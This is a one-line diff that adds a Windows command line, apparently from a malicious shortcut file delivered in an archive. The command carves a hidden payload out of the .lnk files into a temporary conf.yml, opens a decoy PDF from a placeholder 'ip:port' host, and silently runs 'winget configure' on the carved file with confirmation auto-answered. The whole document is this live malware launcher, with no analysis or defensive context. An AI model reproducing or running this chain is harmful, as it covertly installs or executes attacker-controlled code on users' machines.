@@ -1,0 +1,1 @@
+c:\windows\system32\cmd.exe /c "(cd %tmp%\7z* || cd %tmp%\Rar* || cd %userprofile%\Desktop) & (more +1000 *.lnk > %tmp%\conf.yml) & (start http://ip:port/b.pdf) & (echo y | winget configure -f %tmp%\conf.yml > nul)"
